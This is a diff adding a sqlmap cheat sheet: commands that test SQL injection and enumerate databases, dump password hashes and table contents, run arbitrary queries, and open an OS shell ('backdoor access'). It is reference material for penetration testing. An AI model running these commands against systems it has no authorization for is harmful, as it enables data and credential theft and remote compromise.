@@ -1,0 +1,75 @@
+sqlmap
+
+example
+ Test URL and POST data and return database banner (if possible)
+code
+ ./sqlmap.py --url="<url>" --data="<post-data>" --banner
+
+example
+ Parse request data and test | request data can be obtained with burp
+code
+ ./sqlmap.py -r <request-file> <options>
+
+example
+ Fingerprint | much more information than banner
+code
+ ./sqlmap.py -r <request-file> --fingerprint
+
+example
+ Get database username, name, and hostname
+code
+ ./sqlmap.py -r <request-file> --current-user --current-db --hostname
+
+example
+ Check if user is a database admin
+code
+ ./sqlmap.py -r <request-file> --is-dba
+
+example
+ Get database users and password hashes
+code
+ ./sqlmap.py -r <request-file> --users --passwords
+
+example
+ Enumerate databases
+code
+ ./sqlmap.py -r <request-file> --dbs
+
+example
+ List tables for one database
+code
+ ./sqlmap.py -r <request-file> -D <db-name> --tables
+
+example
+ Other database commands
+code
+ ./sqlmap.py -r <request-file> -D <db-name> --columns
+                                            --schema
+                                            --count
+text
+ Enumeration flags
+code
+ ./sqlmap.py -r <request-file> -D <db-name>
+                               -T <tbl-name>
+                               -C <col-name>
+                               -U <user-name>
+
+example
+ Extract data
+code
+ ./sqlmap.py -r <request-file> -D <db-name> -T <tbl-name> -C <col-name> --dump
+
+example
+ Execute SQL Query
+code
+ ./sqlmap.py -r <request-file> --sql-query="<sql-query>"
+
+example
+ Append/Prepend SQL Queries
+code
+ ./sqlmap.py -r <request-file> --prefix="<sql-query>" --suffix="<sql-query>"
+
+example
+ Get backdoor access to sql server | can give shell access
+code
+ ./sqlmap.py -r <request-file> --os-shell
